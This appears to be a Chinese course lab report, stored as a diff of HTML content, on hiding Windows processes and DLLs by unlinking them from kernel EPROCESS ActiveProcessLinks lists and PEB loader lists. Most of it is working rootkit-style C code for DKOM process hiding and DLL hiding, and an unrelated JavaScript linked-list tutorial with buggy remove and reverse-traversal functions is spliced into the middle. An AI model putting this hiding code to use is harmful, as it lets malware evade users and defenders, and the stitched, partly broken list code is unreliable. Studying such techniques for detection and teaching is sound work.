@@ -1,0 +1,572 @@
+I":<h1 id="活动进程操作和隐藏">活动进程操作和隐藏</h1>
+
+<h2 id="一实验要求">一、实验要求</h2>
+
+<p>试利用windbg、KD或SoftICE查看EProcess和PEB中活动进程相关信息，绘制出当前活动进程双向链表在内核态和用户态下的进程链表结构，并设计”断链”方法利用这两个结构体实现自己任意指定进程在任务管理器中的隐藏。</p>
+
+<h2 id="二实验步骤">二、实验步骤</h2>
+
+<p>Windows任务管理器使用双向链接的执行进程（EPROCESS）结构列表来帮助跟踪当前正在执行的进程。EPROCESS块驻留在系统地址空间（内核域）中，并包含有关进程的大量信息。该块还包含对操作系统内部也使用的许多相关结构的引用; KPROCESS块，KTHREAD块以及表示构成每个进程的一个或多个线程的所有ETHREAD块。</p>
+
+<p>ActiveProcessLinks字段是我们最感兴趣的结构。它是指向此进程的_LIST_ENTRY结构的指针，该结构包含指向列表中之前（BLINK）和紧接在（FLINK）之后的进程的指针。</p>
+
+<p>typedef struct _LIST_ENTRY {</p>
+
+<p>struct _LIST_ENTRY *FLink;</p>
+
+<p>struct _LIST_ENTRY *BLink;</p>
+
+<p>} LIST_ENTRY, *PLIST_ENTRY;</p>
+
+<p>为了隐藏我们的过程，我们基本上只需要从双向链表中删除第N个项目。Aka重写周围条目中的指针以指向彼此，从而跳过第N个条目。</p>
+
+<p><img src="https://gitee.com/btbsja/BlogImg/raw/master/blog/2020/03/20200309095411.png" alt="" />{width=”5.768055555555556in” height=”2.9229166666666666in”}实现方法：寻找ActiveProcessLinks指针, 在获得EPROCESS指针之后，我们需要发现我们当前正在迭代的过程的PID。回顾一下EPROCESS结构，我们可以看到+ 0x0b4处的第6个字段是UniqueProcessID：</p>
+
+<p>+0x0b4 UniqueProcessId : Ptr32 Void</p>
+
+<p>如果我们选择一个进程，并迭代其_EPROCESS结构中的字段，我们可以将每个字段与PID（ULONG）进行比较，并可能发现偏移量。我们将使用3个不同的过程来平均我们的结果，并确保在该位置找到内存中的PID不是侥幸。</p>
+
+<p>ULONG find_eprocess_pid_offset() {</p>
+
+<p>ULONG pid_ofs = 0; // The offset we're looking for</p>
+
+<p>int idx = 0; // Index</p>
+
+<p>ULONG pids[3]; // List of PIDs for our 3 processes</p>
+
+<p>PEPROCESS eprocs[3]; // Process list, will contain 3 processes</p>
+
+<p>//Select 3 process PIDs and get their EPROCESS Pointer</p>
+
+<p>for (int i = 16; idx&lt;3; i += 4)</p>
+
+<p>{</p>
+
+<p>if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i, &amp;eprocs[idx])))</p>
+
+<p>{</p>
+
+<p>pids[idx] = i;</p>
+
+<p>idx++;</p>
+
+<p>}</p>
+
+<p>}</p>
+
+<p>/*</p>
+
+<p>Go through the EPROCESS structure and look for the PID</p>
+
+<p>we can start at 0x20 because UniqueProcessId should</p>
+
+<p>not be in the first 0x20 bytes,</p>
+
+<p>also we should stop after 0x200 bytes with no success</p>
+
+<p>*/</p>
+
+<p>for (int i = 0x20; i&lt;0x200; i += 4)</p>
+
+<p>{</p>
+
+<p>if ((*(ULONG *)((UCHAR *)eprocs[0] + i) == pids[0])</p>
+
+<p>&amp;&amp; (*(ULONG *)((UCHAR *)eprocs[1] + i) == pids[1])</p>
+
+<p>&amp;&amp; (*(ULONG *)((UCHAR *)eprocs[2] + i) == pids[2]))</p>
+
+<p>{</p>
+
+<p>pid_ofs = i;</p>
+
+<p>break;</p>
+
+<p>}</p>
+
+<p>}</p>
+
+<p>ObDereferenceObject(eprocs[0]);</p>
+
+<p>ObDereferenceObject(eprocs[1]);</p>
+
+<p>ObDereferenceObject(eprocs[2]);</p>
+
+<p>return pid_ofs;</p>
+
+<p>}</p>
+
+<p>一旦我们知道PID偏移，就很容易获得ActiveProcessLinks偏移量。由于我们知道ActiveProcessLinks是结构中的下一个字段，因此我们只需要添加4个字节（Int32）或8个字节（Int64），具体取决于系统架构。确定驱动程序编译的架构的一种好方法是检查指针大小。32位架构将具有4个字节指针，64位架构将具有8个字节指针。对于32位和64位Windows，Microsoft的INT_PTR数据类型将扩展为指针的正确大小：</p>
+
+<p>// Get PID offset</p>
+
+<p>ULONG PID_OFFSET = find_eprocess_pid_offset();</p>
+
+<p>// Initialize LIST_ENTRY offset</p>
+
+<p>ULONG LIST_OFFSET = PID_OFFSET;</p>
+
+<p>// Check Architecture using pointer size</p>
+
+<p>INT_PTR ptr;</p>
+
+<p>// Ptr size 8 if compiled for a 64-bit machine</p>
+
+<p>// 4 if compiled for 32-bit machine</p>
+
+<p>LIST_OFFSET += sizeof(ptr);</p>
+
+<p>然后，根据结果，将向PID_OFFSET添加4或8个字节以确定LIST_ENTRY偏移量。</p>
+
+<p>以下是实现进程断链隐藏的DKOM和GDB调试方法代码</p>
+
+<p>PCHAR modifyTaskList(UINT32 pid) {</p>
+
+<p>LPSTR result = ExAllocatePool(NonPagedPool, sizeof(ULONG) + 20);;</p>
+
+<p>// Get PID offset nt!_EPROCESS.UniqueProcessId</p>
+
+<p>ULONG PID_OFFSET = find_eprocess_pid_offset();</p>
+
+<p>// Check if offset discovery was successful</p>
+
+<p>if (PID_OFFSET == 0) {</p>
+
+<p>return (PCHAR)"Could not find PID offset!";</p>
+
+<p>}</p>
+
+<p>// Get LIST_ENTRY offset nt!_EPROCESS.ActiveProcessLinks</p>
+
+<p>ULONG LIST_OFFSET = PID_OFFSET;</p>
+
+<p>// Check Architecture using pointer size</p>
+
+<p>INT_PTR ptr;</p>
+
+<p>// Ptr size 8 if compiled for a 64-bit machine, 4 if compiled for 32-bit machine</p>
+
+<p>LIST_OFFSET += sizeof(ptr);</p>
+
+<p>// Record offsets for usermode buffer</p>
+
+<p>sprintf_s(result, 2 * sizeof(ULONG) + 30, "Found offsets: %lu &amp; %lu", PID_OFFSET, LIST_OFFSET);</p>
+
+<p>// Get current process</p>
+
+<p>PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();</p>
+
+<p>// Initialize other variables</p>
+
+<p>PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);</p>
+
+<p>PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);</p>
+
+<p>// Check self</p>
+
+<p>if (*(UINT32 *)CurrentPID == pid) {</p>
+
+<p>remove_links(CurrentList);</p>
+
+<p>return (PCHAR)result;</p>
+
+<p>}</p>
+
+<p>// Record the starting position</p>
+
+<p>PEPROCESS StartProcess = CurrentEPROCESS;</p>
+
+<p>// Move to next item</p>
+
+<p>CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList-&gt;Flink - LIST_OFFSET);</p>
+
+<p>CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);</p>
+
+<p>CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);</p>
+
+<p>// Loop until we find the right process to remove</p>
+
+<p>// Or until we circle back</p>
+
+<p>while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS) {</p>
+
+<p>// Check item</p>
+
+<p>if (*(UINT32 *)CurrentPID == pid) {</p>
+
+<p>remove_links(CurrentList);</p>
+
+<p>return (PCHAR)result;</p>
+
+<p>}</p>
+
+<p>// Move to next item</p>
+
+<p>CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList-&gt;Flink - LIST_OFFSET);</p>
+
+<p>CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);</p>
+
+<p>CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);</p>
+
+<p>}</p>
+
+<p>return (PCHAR)result;</p>
+
+<p>}</p>
+
+<p>最后实际删除：</p>
+
+<p>void remove_links(PLIST_ENTRY Current) {</p>
+
+<p>PLIST_ENTRY Previous, Next;</p>
+
+<p>Previous = (Current-&gt;Blink);</p>
+
+<p>Next = (Current-&gt;Flink);</p>
+
+<p>// Loop over self (connect previous with next)</p>
+
+<p>Previous-&gt;Flink = Next;</p>
+
+<p>Next-&gt;Blink = Previous;</p>
+
+<p>// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)</p>
+
+<p>Current-&gt;Blink = (PLIST_ENTRY)&amp;Current-&gt;Flink;</p>
+
+<p>Current-&gt;Flink = (PLIST_ENTRY)&amp;Current-&gt;Flink;</p>
+
+<p>return;</p>
+
+<p>}</p>
+
+<p>1、创建Node类</p>
+
+<p>function Node(element) {</p>
+
+<p>this.element=element;</p>
+
+<p>this.next = null;</p>
+
+<p>this.previous=null;}</p>
+
+<p>2、查找最后的节点</p>
+
+<p>this.lastNode = function () {</p>
+
+<p>var lastNode = this.head;</p>
+
+<p>while (lastNode.next != null) {</p>
+
+<p>lastNode = lastNode.next;</p>
+
+<p>}</p>
+
+<p>return lastNode;</p>
+
+<p>}</p>
+
+<p>3、查找节点</p>
+
+<p>this.find = function (element) {</p>
+
+<p>var node = this.head;</p>
+
+<p>while (node != null &amp;&amp; node.element != element) {</p>
+
+<p>node = node.next;</p>
+
+<p>}</p>
+
+<p>return node;</p>
+
+<p>}</p>
+
+<p>4、在after后插入节点</p>
+
+<p>this.insertAfter = function (element, after) {</p>
+
+<p>//找到当前节点</p>
+
+<p>var node = this.find(after);</p>
+
+<p>//创建新的节点</p>
+
+<p>var newNode = new Node(element);</p>
+
+<p>//新节点和当前节点的后一个节点连接在一起</p>
+
+<p>if (node.next != null)</p>
+
+<p>node.next.previous=newNode;</p>
+
+<p>newNode.next = node.next;</p>
+
+<p>//连接当前节点和after节点</p>
+
+<p>node.next = newNode;</p>
+
+<p>newNode.previous = node;</p>
+
+<p>}</p>
+
+<p>5、在before前插入节点</p>
+
+<p>this.insertBefore = function (element, before) {</p>
+
+<p>//找到当前节点</p>
+
+<p>var node = this.find(before);</p>
+
+<p>if(node.previous==null){</p>
+
+<p>return;</p>
+
+<p>}</p>
+
+<p>//创建新的节点</p>
+
+<p>var newNode = new Node(element);</p>
+
+<p>//新节点和当前节点的前一个节点连接在一起;</p>
+
+<p>node.previous.next = newNode;</p>
+
+<p>newNode.previous = node.previous;</p>
+
+<p>//连接当前节点和before节点</p>
+
+<p>node.previous = newNode;</p>
+
+<p>newNode.next = node;</p>
+
+<p>}</p>
+
+<p>6、删除节点</p>
+
+<p>this.remove = function (element) {</p>
+
+<p>//获得当前的节点</p>
+
+<p>var node = this.find(element);</p>
+
+<p>//获得当前节点的前一个节点</p>
+
+<p>var preNode = node.previous;</p>
+
+<p>//获得当前节点的后一个节点</p>
+
+<p>var nextNode = node.next;</p>
+
+<p>//连接节点</p>
+
+<p>preNode.next = nextNode;</p>
+
+<p>if (nextNode != null) {</p>
+
+<p>preNode = nextNode.previous;</p>
+
+<p>}</p>
+
+<p>}</p>
+
+<p>7、遍历链表</p>
+
+<p>this.forEach = function (call) {</p>
+
+<p>var node = this.head;</p>
+
+<p>while (node != null) {</p>
+
+<p>call(node);</p>
+
+<p>node = node.next;</p>
+
+<p>}</p>
+
+<p>}</p>
+
+<p>8、反向遍历链表</p>
+
+<p>this.forEach = function (call) {</p>
+
+<p>var node = this.head;</p>
+
+<p>while (node != null) {</p>
+
+<p>call(node);</p>
+
+<p>node = node.next;</p>
+
+<p>}</p>
+
+<p>}</p>
+
+<p>9、当前节点向前移动n个节点</p>
+
+<p>this.advance=function (currElement,n){</p>
+
+<p>//获得当前节点</p>
+
+<p>var currentNode = this.find(currElement);</p>
+
+<p>//获得当前节点的前一个节点</p>
+
+<p>var buffer = currentNode.previous;</p>
+
+<p>var preNode = buffer;</p>
+
+<p>while(preNode.element!='head'&amp;&amp;n&gt;0){</p>
+
+<p>preNode = preNode.previous;</p>
+
+<p>n--;</p>
+
+<p>}</p>
+
+<p>if(currentNode.next!=null){</p>
+
+<p>buffer.next=currentNode.next;</p>
+
+<p>currentNode.next.previous = buffer;</p>
+
+<p>currentNode.next=preNode.next;</p>
+
+<p>preNode.next.previous = currentNode;</p>
+
+<p>preNode.next=currentNode;</p>
+
+<p>currentNode.previous=preNode;</p>
+
+<p>}</p>
+
+<p>}</p>
+
+<p>10、当前节点向后移动n个节点</p>
+
+<p>this.back=function (currElement,n){</p>
+
+<p>//获得当前节点</p>
+
+<p>var currentNode = this.find(currElement);</p>
+
+<p>//假设当前节点为最后节点</p>
+
+<p>var lastNode = currentNode;</p>
+
+<p>//在n&gt;0的条件下，下一个节点为空的时候停下来</p>
+
+<p>while(lastNode.next!=null&amp;&amp;n&gt;0){</p>
+
+<p>lastNode = lastNode.next;</p>
+
+<p>n--;</p>
+
+<p>}</p>
+
+<p>//currentNode节点和lastNode相等，说明currentNode本身就是最后的节点</p>
+
+<p>if(currentNode==lastNode){</p>
+
+<p>return;</p>
+
+<p>}</p>
+
+<p>//当前节点的前一个节点和当前节点的后一个节点连接在一起</p>
+
+<p>currentNode.previous.next = currentNode.next;</p>
+
+<p>currentNode.next.previous=currentNode.previous;</p>
+
+<p>//把当前节点连在lastNode节点后面</p>
+
+<p>currentNode.next=lastNode.next;</p>
+
+<p>lastNode.next=currentNode;</p>
+
+<p>currentNode.previous=lastNode;</p>
+
+<p>currentNode.next.previous=currentNode;</p>
+
+<p>}</p>
+
+<p>}</p>
+
+<p><img src="https://gitee.com/btbsja/BlogImg/raw/master/blog/2020/03/20200309095412.jpeg" alt="1" />{width=”5.766666666666667in” height=”1.8090277777777777in”}</p>
+
+<p>断链法</p>
+
+<p>typedef struct _UNICODE_STRING<br />
+{<br />
+ USHORT Length;<br />
+ USHORT MaximumLength;<br />
+ PWSTR  Buffer;<br />
+} UNICODE_STRING,*PUNICODE_STRING;</p>
+
+<p>typedef struct _PEB_LDR_DATA {<br />
+ ULONG                   Length;<br />
+ BOOLEAN                 Initialized;<br />
+ PVOID                   SsHandle;<br />
+ LIST_ENTRY              InLoadOrderModuleList;<br />
+ LIST_ENTRY              InMemoryOrderModuleList;<br />
+ LIST_ENTRY              InInitializationOrderModuleList;<br />
+} PEB_LDR_DATA, *PPEB_LDR_DATA;</p>
+
+<p>typedef struct _LDR_MODULE<br />
+{<br />
+ LIST_ENTRY          InLoadOrderModuleList;   //+0x00<br />
+ LIST_ENTRY          InMemoryOrderModuleList; //+0x08  <br />
+ LIST_ENTRY          InInitializationOrderModuleList; //+0x10<br />
+ void*               BaseAddress;  //+0x18<br />
+ void*               EntryPoint;   //+0x1c<br />
+ ULONG               SizeOfImage;<br />
+ UNICODE_STRING      FullDllName;<br />
+ UNICODE_STRING      BaseDllName;<br />
+ ULONG               Flags;<br />
+ SHORT               LoadCount;<br />
+ SHORT               TlsIndex;<br />
+ HANDLE              SectionHandle;<br />
+ ULONG               CheckSum;<br />
+ ULONG               TimeDateStamp;<br />
+} LDR_MODULE, *PLDR_MODULE;</p>
+
+<p>void CMyHookDlg::HideDll()<br />
+{<br />
+ HMODULE hMod = ::GetModuleHandle("kernel.dll"); <br />
+ PLIST_ENTRY Head,Cur;<br />
+ PPEB_LDR_DATA ldr;<br />
+ PLDR_MODULE ldm;<br />
+ __asm<br />
+ {<br />
+  mov eax , fs:[0x30]<br />
+  mov ecx , [eax + 0x0c] //Ldr<br />
+  mov ldr , ecx<br />
+ }<br />
+ Head = &amp;(ldr-&gt;InLoadOrderModuleList);<br />
+ Cur = Head-&gt;Flink;<br />
+ do<br />
+ {<br />
+  ldm = CONTAINING_RECORD( Cur, LDR_MODULE, InLoadOrderModuleList);<br />
+  //printf("EntryPoint [0x%X]/n",ldm-&gt;BaseAddress);<br />
+  if( hMod == ldm-&gt;BaseAddress)<br />
+  {<br />
+   ldm-&gt;InLoadOrderModuleList.Blink-&gt;Flink =<br />
+    ldm-&gt;InLoadOrderModuleList.Flink;<br />
+   ldm-&gt;InLoadOrderModuleList.Flink-&gt;Blink =<br />
+    ldm-&gt;InLoadOrderModuleList.Blink; <br />
+   ldm-&gt;InInitializationOrderModuleList.Blink-&gt;Flink =<br />
+    ldm-&gt;InInitializationOrderModuleList.Flink;<br />
+   ldm-&gt;InInitializationOrderModuleList.Flink-&gt;Blink =<br />
+    ldm-&gt;InInitializationOrderModuleList.Blink;  <br />
+   ldm-&gt;InMemoryOrderModuleList.Blink-&gt;Flink =<br />
+    ldm-&gt;InMemoryOrderModuleList.Flink;<br />
+   ldm-&gt;InMemoryOrderModuleList.Flink-&gt;Blink =<br />
+    ldm-&gt;InMemoryOrderModuleList.Blink;  <br />
+   break;<br />
+  }<br />
+  Cur= Cur-&gt;Flink; <br />
+ }while(Head != Cur);<br />
+}</p>
+
+<p><img src="https://gitee.com/btbsja/BlogImg/raw/master/blog/2020/03/20200309095413.png" alt="D:\QQArchive\174474853\Image\C2C\3E_CGW0PR5K2ACE_$3OD_`4.jpg" />{width=”6.665277777777778in” height=”6.21875in”}</p>
+:ET
